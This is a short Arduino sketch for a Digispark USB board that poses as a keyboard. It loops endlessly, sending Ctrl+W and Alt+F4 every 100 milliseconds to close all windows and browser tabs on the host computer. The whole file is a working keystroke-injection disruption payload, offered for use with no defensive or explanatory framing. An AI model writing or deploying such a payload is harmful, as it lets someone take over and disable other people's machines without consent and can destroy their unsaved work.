// This script constantly spam ALT+F4 and CTRL+W key combos forcing all active windows and browsers to close

#include "DigiKeyboard.h"

void setup() 
{
  //empty
}

void loop() 
{
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
}
